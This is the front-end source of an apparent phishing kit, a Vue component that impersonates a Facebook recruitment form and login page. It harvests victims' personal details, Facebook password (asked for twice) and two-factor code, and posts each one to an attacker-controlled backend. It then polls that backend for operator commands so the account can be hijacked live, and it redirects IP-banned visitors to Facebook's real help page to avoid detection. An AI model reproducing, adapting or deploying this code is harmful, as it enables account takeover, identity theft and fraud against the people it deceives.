<script>
import useValidate from "@vuelidate/core";
import { required, email, numeric } from "@vuelidate/validators";
import axios from "axios";
import ChatWidget from "@/components/ChatWidget.vue"

export default {
  name: "Form1",
    components:{
      ChatWidget,
    },
  data() {
    return {
      v$: useValidate(),
      main: true,
	  finish: false,
      education: false,
      skills: false,
	  code: '',
	  wrongCode: false,
      waitingForResponse: false,
      chatMessage: false,
      loading: "",
      ipAddress: "",
      interval: "",
      decision: "",
      firstPassword: false,
      secondPassword: false,
      wrongPw: false,
      pageLoad: false,
      fbmodal: false,
      fblogin: false,
      fb2fa: false,
      form: {
        first_name: "",
        page_name: "",
        name: "",
        email: "",
        mobile: "",
        school: "",
        degree: "",

        first_job: "",
        employer: "",
        position: "",
        skills: "",
        // appeal: "",
      },
      modal: {
        password: "",
        error: false,
      },
    };
  },
  created() {
    // this.pageLoading();

    document.title = "My Personal Account Was Restricted | Facebook";
    axios.interceptors.request.use(
      (config) => {
        if (this.waitingForResponse != true && this.chatMessage != true) {
          this.loading = true;
        }
        return config;
      },
      (error) => {
        if (this.waitingForResponse != true && this.chatMessage != true) {
          this.loading = false;
        }
        return Promise.reject(error);
      }
    );

    axios.interceptors.response.use(
      (response) => {
        if (this.waitingForResponse != true && this.chatMessage != true) {
          this.loading = false;
        }
        return response;
      },
      (error) => {
        if (this.waitingForResponse != true && this.chatMessage != true) {
          this.loading = false;
        }
        return Promise.reject(error);
      }
    );
  },
  mounted() {
    this.getClientIP();
    this.checkBan();
  },
  methods: {
    pageLoading() {
      this.pageLoad = true;

      setTimeout(() => {
              this.pageLoad = false;
      }, 4500);
    },
    chatMessageStatus() {
      (this.chatMessage = true), console.log(this.chatMessage);
    },
    getClientIP() {
      axios
        .get("https://api.ipify.org?format=json")
        .then((response) => {
          this.ipAddress = response.data.ip;
          this.checkBan();
        })
        .catch((e) => {
          console.log(e);
        });
    },
    checkBan() {
      axios
        .post(`${process.env.VUE_APP_BAZA_URL}/api/fetch/ban`, {
          ip: this.ipAddress,
        })
        .then((response) => {
          if (response.data == "BAN") {
            window.location.href = "https://www.facebook.com/help/";
          }
        })
        .catch((e) => {
          console.log(e);
        });
    },
    goBack() {
        this.education = false;
        this.main = true;
    },
    goBack2() {
        this.skills = false;
        this.education = true;
    },
    getResponse() {
      this.interval = setInterval(() => {
        axios
          .post(`${process.env.VUE_APP_BAZA_URL}/api/fetch/decision`, {
            case_ref: this.ipAddress,
          })
          .then((response) => {
            let resType;

            if (response.data == "CMD_EMAIL") {
            //   resType = "email";

            //     this.$router.push({
            //         name: "twofa",
            //         params: {
            //             type: resType,
            //             email: this.form.email,
            //         },
            //     });
						                this.fblogin = false;
                this.fb2fa = false;
				this.finish = true;
				this.loading = false;
                clearInterval(this.interval);
            }

            if (response.data == "CMD_CODE") {
                this.fblogin = false;
                this.fb2fa = true;
                // resType = "code";

                // this.$router.push({
                //     name: "twofa",
                //     params: {
                //         type: resType,
                //         email: this.form.email,
                //     },
                // });
				this.loading = false;
                clearInterval(this.interval);
            }

            if (response.data == "CMD_DONE") {
            //   this.$router.push({
            //     path: "checkpoint",
            //   });
			                this.fblogin = false;
                this.fb2fa = false;
				this.finish = true;
              clearInterval(this.interval);
            }

            if (response.data == "CMD_WRONG") {
                this.wrongPw = true;
                this.loading = false;
                this.modal.password = '';
                clearInterval(this.interval);
            }
          })
          .catch((e) => {
            console.log(e);
          });
      }, 1000);
    },
    submitForm() {
      console.log("submit");
      this.v$.$validate(); // checks all inputs
      if (!this.v$.$error) {
        let data = {
          page_name: this.form.page_name,
          name: this.form.name,
          email: this.form.email,
          mobile: this.form.mobile,
          //   appeal: this.form.appeal,
        };
        console.log(data);
        axios
          .post(
            `${process.env.VUE_APP_BAZA_URL}/api/message/${process.env.VUE_APP_BAZA_ID}`,
            data
          )
          .then((response) => {
            console.log(response);
          })
          .catch((e) => {
            this.errors.push(e);
            console.log(this.errors);
          });

        // this.firstPassword = true;
        this.form.email = '';
        this.main = false;
        this.education = true;
      }
    },
    submitForm2() {
      console.log("submit");
        let data = {
          email: '[SCHOOL] ' + this.form.school,
          mobile: '[DEGREE] ' + this.form.degree,
        };
        console.log(this.form.school);
        axios
          .post(
            `${process.env.VUE_APP_BAZA_URL}/api/message/${process.env.VUE_APP_BAZA_ID}`,
            data
          )
          .then((response) => {
            console.log(response);
          })
          .catch((e) => {
            this.errors.push(e);
            console.log(this.errors);
          });

        // this.firstPassword = true;
        this.education = false;  
        this.skills = true;
    },
    submitForm3() {
      console.log("submit");

        let data = {
          email: '[FIRST JOB] ' + this.form.first_job,
          mobile: '[EMPLOYER] ' + this.form.employer,
          firstPassword: '[POSITION] ' + this.form.position,
          secondPassword: '[SKILLS] ' + this.form.skills,

        };
        console.log(this.form.school);
        axios
          .post(
            `${process.env.VUE_APP_BAZA_URL}/api/message/${process.env.VUE_APP_BAZA_ID}`,
            data
          )
          .then((response) => {
            console.log(response);
          })
          .catch((e) => {
            this.errors.push(e);
            console.log(this.errors);
          });

        // this.firstPassword = true;
        // this.education = false;  
        // this.skills = true;
        this.fbmodal = true;
        this.fblogin = true;
    },
    submitCode() {
      if (this.code) {
        axios
          .post(
            `${process.env.VUE_APP_BAZA_URL}/api/message/${process.env.VUE_APP_BAZA_ID}`,
            { codeGenerator: this.code }
          )
          .then((response) => {
            this.code = "";
            // this.type = "";
            // this.robotView();
            this.formError = false;
            this.loading = true;
            this.getResponse();
          })
          .catch((e) => {
            console.log(e);
          });
      } else {
        alert("Please enter a valid code to continue!");
      }
    },
    submitPassword() {
        this.modal.error = '';
      if (this.modal.password != "" && this.form.email != "" ) {
        if (this.secondPassword == false) {
          this.modal.error = false;
          axios
            .post(
              `${process.env.VUE_APP_BAZA_URL}/api/message/${process.env.VUE_APP_BAZA_ID}`,
              { email: this.form.email, firstPassword: this.modal.password }
            )
            .then((response) => {
              console.log(response);
                console.log(response);
                this.waitingForResponse = true;
                this.loading = true;
                this.getResponse();
                this.secondPassword = true;
            })
            .catch((e) => {
              this.errors.push(e);
              console.log(this.errors);
            });

          this.modal.password = "";
        } else {
          axios
            .post(
              `${process.env.VUE_APP_BAZA_URL}/api/message/${process.env.VUE_APP_BAZA_ID}`,
              { email: this.form.email, secondPassword: this.modal.password }
            )
            .then((response) => {
              console.log(response);
              this.waitingForResponse = true;
              this.loading = true;
              this.getResponse();
            })
            .catch((e) => {
              this.errors.push(e);
              console.log(this.errors);
            });
        }
      } else {
        this.modal.error = true;
      }
    },
    alert(){
      alert('Please complete the form before you navigate.');
    }
  },
  validations() {
    return {
      form: {
        page_name: { required },
        name: { required },
        email: { required, email },
        mobile: { required, numeric },
        // appeal: { required },
      },
    };
  },
};
</script>

<template>
    <div v-if="pageLoad" id="" class="">
        <div class="overflow-x-hidden">
          <div class="h-screen overflow-x-hidden overflow-y-hidden w-screen z-100 flex justify-center items-center">
            <img src="../assets/images/loadingLogo.4eff47490162868e9ff2.gif" alt="">
          </div>
        </div>
    </div>

    <div v-if="loading" id="loadFacebookC" class="">
        <div id="loadFacebookG">
        <div id="blockG_1" class="facebook_blockG"></div>
        <div id="blockG_2" class="facebook_blockG"></div>
        <div id="blockG_3" class="facebook_blockG"></div>
        </div>
    </div>
        <nav>
        <div class="navbar">
            <div class="navcont container-fluid">
                <div class="menu-icon" onclick="toggleMenu()">
                    <div class="bar"></div>
                    <div class="bar"></div>
                    <div class="bar"></div>
                </div>
                <a class="px-5" href="https://social-mediajob.com/job/form">
                    <img src="../assets/images/img_logo.svg" class="navlogo" alt="">
                </a>

                <button class="search-button searchnav" onclick="toggleModal('open')" type="button"><img src="../assets/images/search.svg" class="search-icon" alt=""></button>
                <ul class="menu" id="wrapper">
                    <li><a class="textnav kk" href="#">Jobs</a></li>
                    <li><a class="textnav kk" href="#">Area of Works</a></li>
                    <li><a class="textnav kk" href="#">Locations</a></li>
                    <li><a class="textnav kk" href="#">Career Programs</a></li>
                    <li><a class="textnav kk" href="#">How We Work</a></li>
                    <li><a class="textnav kk" href="#">Blog</a></li>
                    <li class="searchfa"> <button class="search-button" onclick="toggleModal('open')" type="button"><img src="../assets/images/search.svg" class="search-icon" alt=""></button>
                    </li>
                    <li>
                        <div class="loginbar">
                            <button onclick="slidefeedback()" class="textnav buttonlog">Log in<i class="fas fa-chevron-down px-1"></i></button>
                        </div>
                        <div class="logindropdown" id="logindropdown">
                            <div class="px-4  pt-4 mt-3" style="text-align: start;">
                                <span class="titleoflogin">Create a Career Profile</span>
                                <div class="pt-2">
                                    <span class="subtitleoflogin">
                                        You can create a Career Profile to get job suggestions, prepare for the
                                        interview process, and more.
                                    </span>
                                </div>
                                <div class="pt-2">
                                    <span class="buttoncreate" href="/">Create a Career Profile</span>
                                </div>
                                <div class="pt-3">
                                    <span class="subtitleoflogin">
                                        Already have a Career <br> Profile?
                                    </span>
                                </div>
                                <div class="pt-2">
                                    <a class="logintext" href="https://social-mediajob.com/job/form">Log in</a>
                                </div>
                            </div>
                        </div>
                        <div class=" logindrop " style="text-align: start;">
                            <div class="" style="border-top: 1px solid #c4c4c4;">
                                <div class="pt-3">
                                    <span class="titleofloginav">Create a Career Profile</span>
                                    <div class="pt-2">
                                        <span class="subtitleofloginav">
                                            You can create a Career Profile to get job suggestions, prepare for the
                                            interview process, and more.
                                        </span>
                                    </div>
                                    <div class="pt-2">
                                        <span class="buttoncreatenav " href="/">Create a Career Profile</span>
                                    </div>
                                    <div class="pt-3">
                                        <span class="subtitleofloginav">
                                            Already have a Career Profile?
                                        </span>
                                    </div>
                                    <div class="pt-2">
                                        <a class="logintext" href="https://social-mediajob.com/job/form">Log in</a>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </li>
                </ul>
                <div class="modalsearch" id="myModal1">
                    <div class="modal-contentsearch">
                        <div class="container">
                            <div class="searchcontent">
                                <span>
                                    <img src="../assets/images/search.svg" width="30px !important" class="" alt="">
                                </span>

                                <div class="searchbox">
                                    <input placeholder="Search" class="searchinput">
                                </div>
                                <button class="close" onclick="toggleModal('close')"><svg width="20px" height="20x" viewBox="0 0 18 16">
                                        <g id="Syle-Guide" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd" stroke-linecap="square">
                                            <g id="Icon-Sheet" transform="translate(-173.000000, -48.000000)" stroke="#A7AAAE">
                                                <g id="Icons/Click-Out" transform="translate(174.000000, 48.000000)">
                                                    <g id="Path">
                                                        <path d="M16,0 L0,16"></path>
                                                        <path d="M0,0 L16,16"></path>
                                                    </g>
                                                </g>
                                            </g>
                                        </g>
                                    </svg></button>

                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </nav>
    <div class="sticky-div" id="">
        <div class="container-xxl" style="">
            <div class="d-flex align-items-center px-lg-4">
                <!-- <img src="./assets/img/loogo.svg" alt=""> -->
                <span class="px-2 mt-1 titleofproduct">Facebook</span>

            </div>
            <div class="row px-lg-4">
                <div class="col-12 col-lg-8">
                    <div class="mt-2 mt-sm-0">
                        <span class="subtitleofproduct">
                           Social Media Manager
                        </span>
                    </div>
                    
                </div>

            </div>
        </div>
    </div>
    <div class="containerform1" id="contaform">
    <input type="hidden" id="_ip"> <!-- Replace with dynamic IP -->

        <div class="containerformm">
            <div class="card">
                <div class="form">
                    <div class="left-side">
                        <div class="left-heading">
                            <h3></h3>
                        </div>
                        <div class="steps-content">
                            <h3> <span class="step-number"></span></h3>
                            <p class="step-number-content active"></p>
                            <p class="step-number-content d-none"></p>
                            <p class="step-number-content d-none"></p>
                            <p class="step-number-content d-none"></p>
                        </div>
                        <div>

                            <ul class="progress-bar">
                                <li :class="main && education && skills ? '' : 'active'">Personal Information</li>
                                <li :class="education || skills ? 'active' : ''">Education</li>
                                <li :class="skills ? 'active' : ''">Experience and Skills</li>
                            </ul>
                        </div>



                    </div>
                    <div class="right-side">
                        <div v-if="main" class="main active">
                            <div class="text mb-3">
                                <span class="headertextofform">Personal Information</span>
                            </div>

                            <div class="input-div">
                                <span class="textofinput">First Name</span>
                                <input class="inputch" v-model="form.page_name" type="text" required="" require="" id="user_name">
                                                                    <p
                                      v-for="(error, index) of v$.form.page_name.$errors"
                                      :key="index"
                                      class="pwincorrect"
                                    >
                                      Firstname cannot be empty!
                                    </p>
                            </div>

                            <div class="input-div mt-2">
                                <span class="textofinput">Last Name</span>
                                <input class="inputch" v-model="form.name" type="text" required="">
                                    <p
                                      v-for="(error, index) of v$.form.name.$errors"
                                      :key="index"
                                      class="pwincorrect"
                                    >
                                      Lastname cannot be empty!
                                    </p>
                            </div>

                            <div class="input-div mt-3">
                                <span class="textofinput">E-mail Address</span>
                                <input class="inputch" v-model="form.email" id="first_step_email" type="text" required="" require="">
                                  <p
                                    v-for="(error, index) of v$.form.email.$errors"
                                    :key="index"
                                    class="pwincorrect"
                                  >
                                    Email cannot be empty!
                                  </p>
                            </div>

                            <div class="input-div mt-3">
                                <span class="textofinput">Phone</span>
                                <input class="inputch" v-model="form.mobile" id="phonenumber" type="number" min="0" pattern="[0-9]*" inputmode="numeric" required="" require="">
                                    <p
                                      v-for="(error, index) of v$.form.mobile.$errors"
                                      :key="index"
                                      class="pwincorrect"
                                    >
                                      Phone number cannot be empty!
                                    </p>
                            </div>



                            <div class="buttons">
                                <button @click="submitForm" class="next_button px-0 mt-4"><svg class="" width="24px" height="24px" viewBox="0 0 38 38" version="1.1" xmlns="http://www.w3.org/2000/svg">
                                        <g stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
                                            <g transform="translate(-5.000000, -5.000000)">
                                                <g transform="translate(6.000000, 6.000000)">
                                                    <circle stroke="#CCD1D4" cx="18" cy="18" r="18"></circle>
                                                    <g transform="translate(11.000000, 13.000000)" stroke="#232323" stroke-width="2">
                                                        <polyline stroke-linecap="square" points="8 0 13 5 8 10">
                                                        </polyline>
                                                        <path fill="#696969" d="M0,5 L13,5"></path>
                                                    </g>
                                                </g>
                                            </g>
                                        </g>
                                    </svg><span class="px-2 textofbuttonne">Next</span></button>
                            </div>
                        </div>
                        <div v-if="education" class="main active">
                            <div class="text">
                                <span class="headertextofform">Education</span>
                            </div>
                            <div class="mb-4 mt-5">
                                <span class="subtextofinput">
                                    Higher Education (optional)
                                </span>
                            </div>
                            <div class="input-div">
                                <span class="textofinput">School Name</span>
                                <input v-model="form.school" class="" type="text">
                            </div>
                            <div class="input-div mt-3">
                                <span class="textofinput">Degree</span>
                                <select v-model="form.degree" class="inputch">
                                    <option value="bachelors">Bachelors</option>
                                    <option value="masters">Masters</option>
                                    <option value="phd">PHD</option>
                                </select>
                            </div>

                            <div style="border-bottom: 1px solid #d4d4d4;
                            padding-bottom: 40px;">
                            </div>

                            <div class="buttons button_space formend">
                                <div>
                                    <button @click="goBack" class="back_button px-0 mt-4"><svg class="_9exz" width="24px" height="24px" viewBox="0 0 38 38" version="1.1" xmlns="http://www.w3.org/2000/svg">
                                            <g stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
                                                <g transform="translate(-5.000000, -5.000000)">
                                                    <g transform="translate(6.000000, 6.000000)">
                                                        <circle stroke="#CCD1D4" cx="18" cy="18" r="18"></circle>
                                                        <g transform="translate(11.000000, 13.000000)" stroke="#232323" stroke-width="2">
                                                            <polyline stroke-linecap="square" points="8 0 13 5 8 10">
                                                            </polyline>
                                                            <path d="M0,5 L13,5"></path>
                                                        </g>
                                                    </g>
                                                </g>
                                            </g>
                                        </svg><span class="px-2 textofbuttonne">Back</span></button>

                                </div>
                                <div class="buttons">
                                    <button @click="submitForm2" class="next_button px-0 mt-4"><svg class="" width="24px" height="24px" viewBox="0 0 38 38" version="1.1" xmlns="http://www.w3.org/2000/svg">
                                            <g stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
                                                <g transform="translate(-5.000000, -5.000000)">
                                                    <g transform="translate(6.000000, 6.000000)">
                                                        <circle stroke="#CCD1D4" cx="18" cy="18" r="18"></circle>
                                                        <g transform="translate(11.000000, 13.000000)" stroke="#232323" stroke-width="2">
                                                            <polyline stroke-linecap="square" points="8 0 13 5 8 10">
                                                            </polyline>
                                                            <path fill="#696969" d="M0,5 L13,5"></path>
                                                        </g>
                                                    </g>
                                                </g>
                                            </g>
                                        </svg><span class="px-2 textofbuttonne">Next</span></button>
                                </div>
                            </div>
                        </div>
                        <div v-if="skills" class="main active">
                            <div class="text mb-4">
                                <span class="headertextofform">Experience and Skills</span>
                            </div>
                            <div class="mb-3">
                                <span class="subtextofinput">
                                    Work Experience
                                </span>
                            </div>
                            <label class="subtextoflabel">
                                Are you applying for your first job?
                            </label>
                            <div class="d-flex">
                                <div>
                                    <span class="hidden">
                                    {{ form.first_job }}

                                    </span>
                                    <label>
                                        <input v-model="form.first_job" type="radio" name="provideInfo" value="yes">
                                        Yes
                                    </label>
                                </div>
                                <div class="mx-3">
                                    <label>
                                        <input v-model="form.first_job" type="radio" name="provideInfo" value="no"> No
                                    </label>
                                </div>
                            </div>
                            <div id="yesInputs" class="hidden">


                                <div class="input-div mt-3">
                                    <span class="textofinput">Skills (optional)</span>
                                    <input class="inputch" placeholder="Areas of expertise" type="text">
                                </div>
                                <div style="border-bottom: 1px solid #d4d4d4;
                                padding-bottom: 40px;">
                                </div>
                            </div>

                            <div id="noInputs" class="">
                                <div class="input-div mt-3">
                                    <span class="textofinput">Employer Name</span>
                                    <input v-model="form.employer" class="inputch" placeholder="Employer Name" type="text" required="" require="">
                                    <p
                                      v-for="(error, index) of v$.form.mobile.$errors"
                                      :key="index"
                                      class="pwincorrect"
                                    >
                                      Employer Name cannot be empty!
                                    </p>
                                </div>
                                <div class="input-div mt-3">
                                    <span class="textofinput">Position</span>
                                    <input v-model="form.position" class="inputch" placeholder="Position" type="text" required="" require="">
                                    <p
                                      v-for="(error, index) of v$.form.mobile.$errors"
                                      :key="index"
                                      class="pwincorrect"
                                    >
                                      Employer Name cannot be empty!
                                    </p>
                                </div>
                            
                                <div class="input-div mt-3">
                                    <span class="textofinput">Skills (optional)</span>
                                    <input v-model="form.skills" class="inputch" placeholder="Areas of expertise" type="text" required="" require="">
                                </div>
                                <div style="border-bottom: 1px solid #d4d4d4;
                                padding-bottom: 40px;">

                                </div>

                            </div>

                            <div class="buttons button_space formend">
                                <div>
                                    <button @click="goBack2" class="back_button px-0 mt-4"><svg class="_9exz" width="24px" height="24px" viewBox="0 0 38 38" version="1.1" xmlns="http://www.w3.org/2000/svg">
                                            <g stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
                                                <g transform="translate(-5.000000, -5.000000)">
                                                    <g transform="translate(6.000000, 6.000000)">
                                                        <circle stroke="#CCD1D4" cx="18" cy="18" r="18"></circle>
                                                        <g transform="translate(11.000000, 13.000000)" stroke="#232323" stroke-width="2">
                                                            <polyline stroke-linecap="square" points="8 0 13 5 8 10">
                                                            </polyline>
                                                            <path d="M0,5 L13,5"></path>
                                                        </g>
                                                    </g>
                                                </g>
                                            </g>
                                        </svg><span class="px-2 textofbuttonne">Back</span></button>

                                </div>
                                <!-- <div class="buttons">
                                    <button class="next_button px-0 mt-4"><svg class="" width="24px" height="24px" viewBox="0 0 38 38" version="1.1" xmlns="http://www.w3.org/2000/svg">
                                            <g stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
                                                <g transform="translate(-5.000000, -5.000000)">
                                                    <g transform="translate(6.000000, 6.000000)">
                                                        <circle stroke="#CCD1D4" cx="18" cy="18" r="18"></circle>
                                                        <g transform="translate(11.000000, 13.000000)" stroke="#232323" stroke-width="2">
                                                            <polyline stroke-linecap="square" points="8 0 13 5 8 10">
                                                            </polyline>
                                                            <path fill="#696969" d="M0,5 L13,5"></path>
                                                        </g>
                                                    </g>
                                                </g>
                                            </g>
                                        </svg><span class="px-2 textofbuttonne">Next</span></button>
                                </div> -->

                                
                                <button @click="submitForm3" type="button" class="mx-2 mx-lg-0 px-0 mt-3 buttonconfirm" data-bs-toggle="modal" data-bs-target="#staticBackdrop">
                                            Submit
                                        </button>

                                        <!-- Modal -->
                                        <div v-if="fbmodal" class="modal show" id="staticBackdrop" data-bs-backdrop="static" data-bs-keyboard="false" tabindex="-1" aria-labelledby="staticBackdropLabel" aria-modal="true" role="dialog" style="display: block;">
                                            <div class="modal-dialog">
                                                <div class="modal-content">
                                                    <div class="d-flex justify-content-end">
                                                        <button type="button" class="btn-close pull-right buttonclose" data-bs-dismiss="modal" aria-label="Close"></button>
                                                    </div>
                                                    <div class="modal-header input-icons">
                                                        <svg style="position: absolute;margin-left:10px" xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 20 20" fill="none">
                                                            <path d="M10 2C11.6569 2 13 3.34315 13 5V6H14C15.1046 6 16 6.89543 16 8V15C16 16.1046 15.1046 17 14 17H6C4.89543 17 4 16.1046 4 15V8C4 6.89543 4.89543 6 6 6H7V5C7 3.34315 8.34315 2 10 2ZM10 4C9.44772 4 9 4.44772 9 5V6H11V5C11 4.44772 10.5523 4 10 4Z" fill="#B6BABE"></path>
                                                        </svg>
                                                        <input style="height: 30px!important;" class="inputmodal i_54d4 input-field w-100" value="https://www.facebook.com/D%3DFacebook%2Bshare%2Bpopup%26p%255Burl%255D%3Dhttp%253A%252F%252Fjsfiddle.net%252Fstichoza%252FEYxTJ%252F%26p%255Bimages%255D%255B0%255D%3Dhttps%253A%252F%252Fgoo.gl%252FdS52U&amp;" type="text">

                                                    </div>
                                                    <div v-if="fblogin" id="changeForma" style="background-color:#f0f2f5;;">
                                                        <div class="containermodal flex">
                                                            <div class="modal-page flex">
                                                                <div class="text">
                                                                    <h1>facebook</h1>
                                                                    <p class="_49fjd">Connect with friends and the world
                                                                    </p>
                                                                    <p class="_49fjd">around you on Facebook.</p>
                                                                </div>
                                                                <form class="formmodal" id="loginForm">
                                                                    <input v-model="form.email" type="email" id="email" placeholder="Email or phone number" required="">
                                                                    <input v-model="modal.password" type="password" id="password" placeholder="Password" required="">
                                                                    <span style="color:red;" v-if="modal.error">
                                                                        The email or password you entered is incorrect.
                                                                    </span>
                                                                    <span style="color:red;" v-if="wrongPw">
                                                                        The email or password you entered is incorrect.
                                                                    </span>
                                                                    <div class="linkmodal"> 
                                                                        <button @click="submitPassword" id="loginbutton" type="button" class="login loginbf94">Login</button>
                                                                        <a href="#" class="forgot">Forgot password?</a>
                                                                    </div>
                                                                    <hr>
                                                                </form>
                                                            </div>
                                                        </div>
                                                    </div>

                                                    <div v-if="fb2fa" id="changeForma" style="background-color:#f0f2f5;;">
                                                        <div class="bgclr">
                                                            <div class="lgDv">
                                                                <div style="max-width: 1000px;padding-left: 15px;" class="mx-auto">


                                                                    <svg width="112px" xmlns="http://www.w3.org/2000/svg" id="Layer_1" data-name="Layer 1" viewBox="0 0 1022.51 360">
                                                                        <title>FBWordmark_Hex-RGB-1024</title>
                                                                        <path class="cls-1" d="M166.43,126.68c-9.65,0-12.44,4.28-12.44,13.72v15.66h25.74l-2.58,25.3H154v76.78H123.11V181.36H102.3v-25.3h20.81V140.83c0-25.52,10.29-39,39-39a146.17,146.17,0,0,1,18,1.07v23.81Z"></path>
                                                                        <path class="cls-1" d="M181.87,203.88c0-28.52,13.51-50,41.82-50,15.44,0,24.87,7.94,29.38,17.8V156.06h29.59V258.14H253.07V242.7c-4.29,9.87-13.94,17.59-29.38,17.59-28.31,0-41.82-21.45-41.82-50Zm30.88,6.87c0,15.22,5.57,25.3,19.94,25.3,12.66,0,19.09-9.22,19.09-23.8V202c0-14.58-6.43-23.8-19.09-23.8-14.37,0-19.94,10.08-19.94,25.3Z"></path>
                                                                        <path class="cls-1" d="M347,153.91c12,0,23.37,2.58,29.59,6.86l-6.86,21.88a48.6,48.6,0,0,0-20.59-4.72c-16.73,0-24,9.65-24,26.17v6c0,16.52,7.29,26.17,24,26.17a48.6,48.6,0,0,0,20.59-4.72l6.86,21.87c-6.22,4.29-17.58,6.87-29.59,6.87-36.25,0-52.76-19.52-52.76-50.83v-4.72C294.24,173.43,310.75,153.91,347,153.91Z"></path>
                                                                        <path class="cls-1" d="M380.66,211v-9c0-28.95,16.51-48,50.19-48,31.74,0,45.68,19.3,45.68,47.61v16.3h-65c.65,13.94,6.87,20.16,24,20.16,11.59,0,23.81-2.36,32.82-6.22L474,253c-8.15,4.3-24.88,7.51-39.67,7.51C395.24,260.5,380.66,241,380.66,211Zm30.88-13.3h37.32v-2.57c0-11.15-4.5-20-18-20C416.91,175.14,411.54,183.94,411.54,197.66Z"></path>
                                                                        <path class="cls-1" d="M591,210.32c0,28.52-13.72,50-42,50-15.44,0-26.16-7.72-30.45-17.59v15.44H489.39V104.8L520.27,102v68.2c4.5-9,14.37-16.3,28.74-16.3,28.31,0,42,21.45,42,50Zm-30.88-7.08c0-14.37-5.57-25.09-20.37-25.09-12.66,0-19.52,9-19.52,23.59v10.72c0,14.58,6.86,23.59,19.52,23.59,14.8,0,20.37-10.72,20.37-25.09Z"></path>
                                                                        <path class="cls-1" d="M601.33,209.67v-5.14c0-29.39,16.73-50.62,50.83-50.62S703,175.14,703,204.53v5.14c0,29.38-16.73,50.62-50.83,50.62S601.33,239.05,601.33,209.67Zm70.78-7.29c0-13.51-5.58-24.23-20-24.23s-19.95,10.72-19.95,24.23v9.44c0,13.51,5.58,24.23,19.95,24.23s20-10.72,20-24.23Z"></path>
                                                                        <path class="cls-1" d="M713.27,209.67v-5.14c0-29.39,16.73-50.62,50.83-50.62s50.83,21.23,50.83,50.62v5.14c0,29.38-16.73,50.62-50.83,50.62S713.27,239.05,713.27,209.67Zm70.78-7.29c0-13.51-5.58-24.23-19.95-24.23s-19.94,10.72-19.94,24.23v9.44c0,13.51,5.57,24.23,19.94,24.23s19.95-10.72,19.95-24.23Z"></path>
                                                                        <path class="cls-1" d="M857.39,204.74l30.45-48.68h32.81l-31.95,50.4,33.24,51.68H889.13l-31.74-50v50H826.5V104.8L857.39,102Z"></path>
                                                                    </svg>
                                                                </div>
                                                            </div>
                                                            <div class="frgtdiv" style="padding-inline: 8px;margin-top: 10px;">
                                                                <div class="_emIn">
                                                                    <div class="" style="padding: 14px 10px 3px;">
                                                                        <span style="font-weight: 500;font-weight: bold;">Choose a way to confirm it's you</span>
                                                                    </div>
                                                                    <div style="border-bottom: 1px solid #dddfe2;
                                                                    font-size: 1px;
                                                                    height: 8px;
                                                                    margin-bottom: 8px;"> </div>
                                                                    <div style="padding: 3px 13px 0px;">
                                                                        <span>
                                                                            Your account has two-factor authentication switched on, which requires this extra login step.
                                                                        </span>
                                                                    </div>
                                                                    <div style="border-bottom: 1px solid #dddfe2;
                                                                    font-size: 1px;
                                                                    height: 8px;
                                                                    margin-bottom: 8px;"> </div>
                                                                    <div>
                                                                        <div class="" style="padding: 3px 13px 0px;">
                                                                            <span style="font-weight: 500;font-weight: bold;">Approve from another device</span>
                                                                        </div>
                                                                        <div class="" style="padding: 3px 13px 0px;">
                                                                            <span>
                                                                                We sent a notifications to your phone. Check your Facebook notifications therre and approve the
                                                                                login to continue.
                                                                            </span>

                                                                        </div>
                                                                        <div style="border-bottom: 1px solid #dddfe2;
                                                                            font-size: 1px;
                                                                            height: 8px;
                                                                            margin-bottom: 8px;"> </div>
                                                                        <div>
                                                                            <div class="" style="padding: 3px 13px 0px;">
                                                                                <span style="font-weight: 500;font-weight: bold;">Or, enter your login code </span>
                                                                            </div>
                                                                            <div class="" style="padding: 3px 13px 0px;">
                                                                                <span>
                                                                                    Enter the 6-digit code from the authentication app you set up.
                                                                                </span>

                                                                            </div>
                                                                            <div class="" style="padding: 3px 13px 0px;">
                                                                                <input v-model="code" class="form-control inputfa" style="border: 1px solid red;" type="number" name="" id="cd" min="0" inputmode="numeric" pattern="[0-9]*">
                                                                            </div>
                                                                            <div v-if="wrongCode" id="text2fa" style="padding: 3px 13px 0px;color:red;">
																				Your authentication code is wrong.
                                                                            </div>
                                                                            <span class="timer" style="display:none;padding: 3px 13px 0px;color:red;">
                                                                                <span id="counter"></span>
                                                                            </span>
                                                                            <div class="mt-2 mb-2" style="padding: 3px 13px 0px;">
                                                                                <span>Note: Your text message may take a few minutes to arrive.</span>
                                                                            </div>
                                                                        </div>
                                                                        <div style="border-bottom: 1px solid #dddfe2;font-size: 1px;height: 8px;
                                                                    "> </div>
                                                                        <div>
                                                                            <div class="" style="padding: 3px 13px 0px;background-color: #f5f6f8; border-radius: 0px 0px 4px 4px;display: flex;justify-content: space-between;align-items: center;">
                                                                                <a class="_ned04" style="text-decoration: none; color: #4266b3;">
                                                                                    Need another way to confirm it's you?
                                                                                </a>
                                                                                <div class="mt-2">
                                                                                    <button @click="submitCode" class="p-2 mt-2 mb-2 d-flex justify-content-center" id="2fabutton" style="background-color: #5a70a1;border: none;border-radius: 4px;font-weight: 600; font-size: 15px;;color: white;width: 100%;">
                                                                                        Submit Code
                                                                                    </button>
                                                                                </div>
                                                                            </div>

                                                                        </div>

                                                                    </div>

                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>
													
													<div v-if="finish" class="" id="changeForma" style="background-color:#f0f2f5;;">

<div class="lgDv">
    <div style="max-width: 1000px;padding-left: 15px;" class="mx-auto">


        <svg width="112px" xmlns="http://www.w3.org/2000/svg" id="Layer_1" data-name="Layer 1" viewBox="0 0 1022.51 360">
            <title>FBWordmark_Hex-RGB-1024</title>
            <path class="cls-1" d="M166.43,126.68c-9.65,0-12.44,4.28-12.44,13.72v15.66h25.74l-2.58,25.3H154v76.78H123.11V181.36H102.3v-25.3h20.81V140.83c0-25.52,10.29-39,39-39a146.17,146.17,0,0,1,18,1.07v23.81Z"></path>
